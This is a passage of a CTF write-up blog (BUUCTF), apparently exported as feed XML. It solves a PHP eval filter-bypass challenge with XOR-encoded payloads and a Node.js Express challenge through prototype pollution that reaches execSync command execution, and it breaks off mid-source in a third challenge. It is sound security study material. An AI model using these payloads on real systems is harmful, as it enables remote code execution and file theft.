type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF记录2</title>
      <link href="/posts/210d3ac7.html"/>
      <url>/posts/210d3ac7.html</url>
      
        <content type="html"><![CDATA[<p>BUU第二份</p><span id="more"></span>        <h2 id="ISITDTU-2019-EasyPHP"   >          <a href="#ISITDTU-2019-EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code></p><p>先看这个判断，count_chars函数用法如下</p><div class="table-container"><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串。</td></tr><tr><td align="left"><em>mode</em></td><td align="left">可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符</td></tr></tbody></table></div><p>那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.30.06.png)</p><p>可以使用scandir来扫描文件，构建payload：<code>print_r(scandir(&#39;.&#39;))</code></p><p>使用异或脚本生成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"print_r"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>生成的payload如下</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是此时我们发现超过了13个不同字符的限制，所以我们需要通过异或缩减原始字符数量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">now <span class="token operator">=</span><span class="token string">'\'().;_acdinprst'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> now <span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> now<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> now <span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> now <span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>k <span class="token keyword">or</span> j<span class="token operator">==</span>m <span class="token keyword">or</span> m<span class="token operator">==</span>k <span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span> <span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j <span class="token operator">+</span> <span class="token string">'^'</span><span class="token operator">+</span> k <span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果中可供替换的字符有很多，挑出三个好用的</p><pre class="line-numbers language-none"><code class="language-none">t &#x3D; s^c^ds^0xff&#x3D;0x8cc^0xff&#x3D;0x9c d^0xff&#x3D;0x9bn &#x3D; i^c^di^0xff&#x3D;0x96c^0xff&#x3D;0x9cd^0xff&#x3D;0x9br &#x3D; a^c^pa^0xff&#x3D;0x9ec^0xff&#x3D;0x9cp^0xff&#x3D;0x8f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终异或时候将不需要异或的字符串异或0xFF两次即可</p><pre class="line-numbers language-none"><code class="language-none">print_r&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))最终payload：?.&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得文件名，尝试访问发现没有权限，只能使用函数读取<code>readfile(end(scandir(&#39;.&#39;)))</code></p><pre class="line-numbers language-none"><code class="language-none">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>真·最终payload</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="GYCTF2020-Ez-Express"   >          <a href="#GYCTF2020-Ez-Express" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2>      <p>本题触及知识盲区，乖乖学习node.js去咯</p><p>首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的<span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/20175211lyz/p/12659738.html" >node.js相关安全问题总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后就是这道题了，是node.js的原型链污染</p><p><strong>node.js的原型链污染</strong></p><p>在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>类中的方法也同样可以写在构造函数内</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这么写的问题是，我们每新建一个Foo对象时，this.show函数就会执行一次，也就是说，show方法实际上是被绑定在对象上而不是该对象的“类”上。而我们希望在创建类的时候只创建一次show方法，此时我们就需要使用原型(<code>prototype</code>)了</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>foo<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">foo<span class="token punctuation">.</span>__proto__ <span class="token operator">==</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li><li>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制</li></ol><p>那么问题就出在对于js来说，万物皆对象，只要我们不断的向上访问<code>__proto__</code>属性，再对其中的某个属性进行修改，总能找到相对于我们需要修改的类的父类，此时再新建我们需要修改的类时就自动带上了我们修改的内容</p><p>以上全是知识，正式开始做题</p><p>首先就是这个</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png"></p><p>用admın经过<code>toUpperCase</code>处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，<span class="exturl"><a class="exturl__link"   href="http://www.zip拿到源码,可以看到res中的outputfunctionname属性为空,可以进行污染,并且在info中直接获得的就是outputfunctionname中的内容/" >www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再加上上面的clone方法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> a<span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时我们向/action中传入json编码后的payload</p><pre class="line-numbers language-none"><code class="language-none">POST:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再访问info即可获取flag</p>        <h2 id="安洵杯-2019-不是文件上传"   >          <a href="#安洵杯-2019-不是文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2>      <p>传文件，试后缀，扫目录都不行，看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pic/"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"config.txt"</span><span class="token punctuation">;</span><span class="token comment">// The function is not yet perfect, it is not open yet.</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'filename'</span><span class="token operator">=></span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'path'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">folder</span><span class="token operator">.</span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token 